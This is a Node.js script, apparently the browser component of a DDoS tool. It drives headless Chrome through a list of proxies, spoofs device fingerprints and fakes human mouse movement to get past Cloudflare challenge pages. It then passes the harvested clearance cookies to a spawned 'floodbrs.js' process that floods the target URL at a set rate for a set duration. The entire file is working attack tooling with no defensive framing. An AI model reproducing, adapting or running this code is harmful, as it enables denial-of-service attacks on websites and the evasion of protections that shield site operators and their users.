const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { spawn, exec  } = require('child_process');

puppeteer.use(StealthPlugin());

const COOKIES_MAX_RETRIES = 3;
const COLORS = {
    RED: '\x1b[31m',
    PINK: '\x1b[35m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    RESET: '\x1b[0m'
};

// Command-line argument validation
if (process.argv.length < 6) {
    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let totalSolves = 0;

// Utility functions
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => 
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};

const validKey = generateRandomString(5, 10);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error('Error reading proxies file:', error.message);
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2 && parts[0].split('.').length === 4) {
        const ipParts = parts[0].split('.');
        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
    }
    return proxy;
};

const coloredLog = (color, text) => {
    console.log(`${color}${text}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents for mobile devices
const userAgents = [
    // Samsung
    `Mozilla/5.0 (Linux; Android 12; SM-S928U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36`,
    // Xiaomi
    `Mozilla/5.0 (Linux; Android 14; 23127PN0CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36`,
    // ASUS ROG
    `Mozilla/5.0 (Linux; Android 13; ASUS_AI2401) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36`,
    // OnePlus
    `Mozilla/5.0 (Linux; Android 14; CPH2551) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36`,
    // Google Pixel
    `Mozilla/5.0 (Linux; Android 13; GPJ41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36`,
    // iPhone
    `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1`
];

// Human-like interaction simulations
const simulateHumanMouseMovement = async (page, element, options = {}) => {
    const { 
        minMoves = 5, 
        maxMoves = 10, 
        minDelay = 50, 
        maxDelay = 150, 
        jitterFactor = 0.1, 
        overshootChance = 0.2, 
        hesitationChance = 0.1, 
        finalDelay = 500 
    } = options;

    const bbox = await element.boundingBox();
    if (!bbox) throw new Error('Element not visible');

    const targetX = bbox.x + bbox.width / 2;
    const targetY = bbox.y + bbox.height / 2;

    const pageDimensions = await page.evaluate(() => ({
        width: window.innerWidth,
        height: window.innerHeight
    }));

    let currentX = Math.random() * pageDimensions.width;
    let currentY = Math.random() * pageDimensions.height;

    const moves = Math.floor(Math.random() * (maxMoves - minMoves + 1)) + minMoves;

    for (let i = 0; i < moves; i++) {
        const progress = i / (moves - 1);
        let nextX = currentX + (targetX - currentX) * progress;
        let nextY = currentY + (targetY - currentY) * progress;

        nextX += (Math.random() * 2 - 1) * jitterFactor * bbox.width;
        nextY += (Math.random() * 2 - 1) * jitterFactor * bbox.height;

        if (Math.random() < overshootChance && i < moves - 1) {
            nextX += (Math.random() * 0.5 + 0.5) * (nextX - currentX);
            nextY += (Math.random() * 0.5 + 0.5) * (nextY - currentY);
        }

        await page.mouse.move(nextX, nextY, { steps: 10 });
        await sleep((Math.random() * (maxDelay - minDelay) + minDelay) / 1000);

        if (Math.random() < hesitationChance) {
            await sleep((Math.random() * (maxDelay - minDelay) + minDelay) * 3 / 1000);
        }

        currentX = nextX;
        currentY = nextY;
    }

    await page.mouse.move(targetX, targetY, { steps: 5 });
    await sleep(finalDelay / 1000);
};

const simulateHumanTyping = async (page, element, text, options = {}) => {
    const { 
        minDelay = 30, 
        maxDelay = 100, 
        mistakeChance = 0.05, 
        pauseChance = 0.02 
    } = options;

    await simulateHumanMouseMovement(page, element);
    await element.click();
    await element.evaluate(el => el.value = '');

    for (const char of text) {
        await sleep((Math.random() * (maxDelay - minDelay) + minDelay) / 1000);

        if (Math.random() < mistakeChance) {
            const randomChar = String.fromCharCode(97 + Math.floor(Math.random() * 26));
            await page.keyboard.press(randomChar);
            await sleep((Math.random() * (maxDelay - minDelay) + minDelay) * 2 / 1000);
            await page.keyboard.press('Backspace');
            await sleep((Math.random() * (maxDelay - minDelay) + minDelay) / 1000);
        }

        await page.keyboard.press(char);

        if (Math.random() < pauseChance) {
            await sleep((Math.random() * (maxDelay - minDelay) + minDelay) * 10 / 1000);
        }
    }
};

const simulateHumanScrolling = async (page, distance, options = {}) => {
    const { 
        minSteps = 5, 
        maxSteps = 15, 
        minDelay = 50, 
        maxDelay = 200, 
        direction = 'down', 
        pauseChance = 0.2, 
        jitterFactor = 0.1 
    } = options;

    const directionMultiplier = direction === 'up' ? -1 : 1;
    const steps = Math.floor(Math.random() * (maxSteps - minSteps + 1)) + minSteps;
    const baseStepSize = distance / steps;
    let totalScrolled = 0;

    for (let i = 0; i < steps; i++) {
        const jitter = baseStepSize * jitterFactor * (Math.random() * 2 - 1);
        let stepSize = Math.round(baseStepSize + jitter);

        if (i === steps - 1) {
            stepSize = (distance - totalScrolled) * directionMultiplier;
        } else {
            stepSize *= directionMultiplier;
        }

        await page.evaluate(scrollAmount => window.scrollBy(0, scrollAmount), stepSize);
        totalScrolled += stepSize * directionMultiplier;

        await sleep((Math.random() * (maxDelay - minDelay) + minDelay) / 1000);

        if (Math.random() < pauseChance) {
            await sleep((Math.random() * (maxDelay - minDelay) + minDelay) * 6 / 1000);
        }
    }
};

const simulateNaturalPageBehavior = async (page) => {
    const dimensions = await page.evaluate(() => ({
        width: document.documentElement.clientWidth,
        height: document.documentElement.clientHeight,
        scrollHeight: document.documentElement.scrollHeight
    }));

    const scrollAmount = Math.floor(dimensions.scrollHeight * (0.2 + Math.random() * 0.6));
    await simulateHumanScrolling(page, scrollAmount, { minSteps: 8, maxSteps: 15, pauseChance: 0.3 });

    await sleep(1 + Math.random() * 3);

    const movementCount = 2 + Math.floor(Math.random() * 4);
    for (let i = 0; i < movementCount; i++) {
        const x = Math.floor(Math.random() * dimensions.width * 0.8) + dimensions.width * 0.1;
        const y = Math.floor(Math.random() * dimensions.height * 0.8) + dimensions.height * 0.1;
        await page.mouse.move(x, y, { steps: 10 + Math.floor(Math.random() * 20) });
        await sleep(0.5 + Math.random());
    }

    if (Math.random() > 0.5) {
        await simulateHumanScrolling(page, scrollAmount / 2, { direction: 'up', minSteps: 3, maxSteps: 8 });
    }
};

// Browser fingerprint spoofing
const spoofFingerprint = async (page) => {
    await page.evaluateOnNewDocument(() => {
        const screenWidth = 360 + Math.floor(Math.random() * 100);
        const screenHeight = 640 + Math.floor(Math.random() * 200);
        Object.defineProperty(window, 'screen', {
            value: {
                width: screenWidth,
                height: screenHeight,
                availWidth: screenWidth,
                availHeight: screenHeight,
                colorDepth: 24,
                pixelDepth: 24
            },
            writable: false
        });

        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const originalToDataURL = canvas.toDataURL;
        canvas.toDataURL = function () {
            ctx.fillStyle = `#${Math.random().toString(16).slice(2, 8)}`;
            ctx.fillRect(0, 0, 10, 10);
            return originalToDataURL.apply(this, arguments);
        };

        Object.defineProperty(navigator, 'platform', { value: 'Linux aarch64', writable: false });
        Object.defineProperty(window, 'devicePixelRatio', { value: 2 + Math.random(), writable: false });
    });
};

// Captcha detection and handling
const detectChallenge = async (browser, page, browserProxy) => {
    try {
        const title = await page.title();
        const content = await page.content();

        if (title === 'Attention Required! | Cloudflare') {
            coloredLog(COLORS.RED, `[INFO] Proxy blocked: ${maskProxy(browserProxy)}`);
            throw new Error('Proxy blocked');
        }

        if (content.includes('challenge-platform')) {
            coloredLog(COLORS.WHITE, `[INFO] Starting bypass for proxy: ${maskProxy(browserProxy)}`);
            await sleep(5);

            const captchaContainer = await page.$('body > div.main-wrapper > div > div > div > div');
            if (captchaContainer) {
                await simulateHumanMouseMovement(page, captchaContainer, {
                    minMoves: 8,
                    maxMoves: 20,
                    minDelay: 40,
                    maxDelay: 150,
                    finalDelay: 1000,
                    jitterFactor: 0.2,
                    overshootChance: 0.4,
                    hesitationChance: 0.3
                });
                await captchaContainer.click();

                await page.waitForFunction(
                    () => !document.querySelector('body > div.main-wrapper > div > div > div > div'),
                    { timeout: 45000 }
                );

                const newTitle = await page.title();
                if (newTitle === 'Just a moment...') {
                    throw new Error('Captcha bypass failed');
                }
            }
        }

        await sleep(10);
    } catch (error) {
        throw error;
    }
};

// Browser launch with retry logic
const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxRetries = 2) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--window-size=360,640',
            `--user-agent=${userAgent}`,
            '--disable-accelerated-2d-canvas',
            '--disable-gpu',
            '--disable-blink-features=AutomationControlled',
            '--disable-infobars',
            '--no-zygote',
            '--single-process',
            '--disable-background-timer-throttling',
            '--disable-renderer-backgrounding',
            '--enable-features=NetworkService,NetworkServiceInProcess',
            '--ignore-certificate-errors',
            '--ignore-ssl-errors',
            '--tls-min-version=1.2',
            '--tls-max-version=1.3',
            '--enable-touch-drag-drop',
            '--touch-events=enabled',
            '--emulate-touch-from-mouse',
            '--enable-viewport',
            '--enable-small-dedicated-cache',
            '--disable-popup-blocking',
            '--disable-component-extensions-with-background-pages',
            '--disable-webrtc-hw-decoding',
            '--disable-webrtc-hw-encoding',
            '--disable-media-session-api',
            '--disable-remote-fonts',
            '--force-color-profile=srgb',
            '--enable-quic',
            '--enable-features=PostQuantumKyber'
        ],
        defaultViewport: {
            width: 360,
            height: 640,
            deviceScaleFactor: 3,
            isMobile: true,
            hasTouch: Math.random() < 0.5,
            isLandscape: false
        }
    };

    try {
        coloredLog(COLORS.YELLOW, `[INFO] Launching browser with proxy: ${maskProxy(browserProxy)}`);
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();
        const client = page._client();

        await spoofFingerprint(page);

        page.on('framenavigated', (frame) => {
            if (frame.url().includes('challenges.cloudflare.com')) {
                client.send('Target.detachFromTarget', { targetId: frame._id }).catch(() => {});
            }
        });

        page.setDefaultNavigationTimeout(60 * 1000);
        await page.goto(targetURL, { waitUntil: 'domcontentloaded' });

        const bodyHandle = await page.$('body');
        if (bodyHandle) {
            await simulateHumanMouseMovement(page, bodyHandle);
        }

        await simulateNaturalPageBehavior(page);
        await detectChallenge(browser, page, browserProxy);

        await sleep(5);

        const title = await page.title();
        const cookies = await page.cookies(targetURL);

        if (!cookies || cookies.length === 0) {
            coloredLog(COLORS.RED, `[INFO] No cookies found for proxy: ${maskProxy(browserProxy)}`);
            throw new Error('No cookies found');
        }

        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ').trim();

        if (!cookieString) {
            coloredLog(COLORS.RED, `[INFO] Empty cookie string for proxy: ${maskProxy(browserProxy)}`);
            throw new Error('Empty cookie string');
        }

        coloredLog(COLORS.GREEN, `[INFO] Successfully got cookies for proxy: ${maskProxy(browserProxy)}`);
        totalSolves++;
        coloredLog(COLORS.GREEN, `[INFO] Total successful solves: ${totalSolves}`);

        await browser.close();
        return { title, browserProxy, cookies: cookieString, userAgent };
    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        if (attempt < maxRetries) {
            await sleep(4);
            return launchBrowserWithRetry(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        return null;
    }
};

// Thread handling
const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
    if (retries >= COOKIES_MAX_RETRIES) {
        done(null, { task, currentTask: queue.length() });
        return;
    }

    try {
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
        if (response) {
            if (response.title === 'Just a moment...') {
                coloredLog(COLORS.RED, `[INFO] Captcha bypass failed for proxy: ${maskProxy(browserProxy)}`);
                await startThread(targetURL, browserProxy, task, done, retries + 1);
                return;
            }

            const cookieInfo = JSON.stringify({
                Page: response.title,
                Proxy: maskProxy(browserProxy),
                'User-agent': response.userAgent,
                cookie: response.cookies
            });
            console.log(cookieInfo);

            try {
                coloredLog(COLORS.YELLOW, `[DEBUG] Spawning floodbrs with args: ${[
                    targetURL, duration.toString(), threads.toString(), response.browserProxy, rate, response.cookies, response.userAgent, validKey
                ].join(', ')}`);

                const floodProcess = spawn('node', [
                    'floodbrs.js',
                    targetURL,
                    duration.toString(),
                    threads.toString(), // Sử dụng threads thay vì thread
                    response.browserProxy,
                    rate,
                    response.cookies,
                    response.userAgent,
                    validKey
                ]);

                floodProcess.stdout.on('data', (data) => {
                    const output = data.toString().trim();
                    if (output) {
                        coloredLog(COLORS.GREEN, `[FLOOD] ${output}`);
                    } else {
                        coloredLog(COLORS.YELLOW, `[FLOOD] Empty output received from floodbrs`);
                    }
                });

                floodProcess.stderr.on('data', (data) => {
                    coloredLog(COLORS.RED, `[FLOOD ERROR] ${data.toString()}`);
                });

                floodProcess.on('error', (error) => {
                    coloredLog(COLORS.RED, `[FLOOD SPAWN ERROR] Failed to spawn floodbrs: ${error.message}`);
                });

                floodProcess.on('exit', (code) => {
                    coloredLog(COLORS.GREEN, `[FLOOD] Process exited with code ${code}`);
                });

                coloredLog(COLORS.GREEN, `[INFO] Started floodbrs for proxy: ${maskProxy(browserProxy)}`);
            } catch (error) {
                coloredLog(COLORS.RED, `[INFO] Error spawning floodbrs: ${error.message}`);
            }

            done(null, { task });
        } else {
            await startThread(targetURL, browserProxy, task, done, retries + 1);
        }
    } catch (error) {
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
};

// Async queue setup
const queue = async.queue((task, done) => {
    startThread(targetURL, task.browserProxy, task, done);
}, threads);

queue.drain(() => {
    coloredLog(COLORS.GREEN, '[INFO] All proxies processed');
});

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[INFO] No proxies found in file. Exiting.');
        process.exit(1);
    }

    coloredLog(COLORS.GREEN, `[INFO] Starting with ${proxies.length} proxies, ${threads} threads, for ${duration} seconds`);

    proxies.forEach(browserProxy => queue.push({ browserProxy }));

    coloredLog(COLORS.YELLOW, `[INFO] Will run for ${duration} seconds`);
    setTimeout(() => {
        coloredLog(COLORS.YELLOW, '[INFO] Time\'s up! Cleaning up...');
        queue.kill();

        exec('pkill -f flood.js', (err) => {
            if (err && err.code !== 1) {
                console.error('Error killing flood.js processes:', err.message);
            } else {
                coloredLog(COLORS.GREEN, '[INFO] Successfully killed flood.js processes');
            }
        });

        exec('pkill -f chrome', (err) => {
            if (err && err.code !== 1) {
                console.error('Error killing Chrome processes:', err.message);
            } else {
                coloredLog(COLORS.GREEN, '[INFO] Successfully killed Chrome processes');
            }
        });

        setTimeout(() => {
            coloredLog(COLORS.GREEN, '[INFO] Exiting');
            process.exit(0);
        }, 5000);
    }, duration * 1000);
};

process.on('uncaughtException', (error) => console.log(error));
process.on('unhandledRejection', (error) => console.log(error));

coloredLog(COLORS.GREEN, '[INFO] Running...');
main().catch(err => {
    coloredLog(COLORS.RED, `[INFO] Main function error: ${err.message}`);
    process.exit(1);
});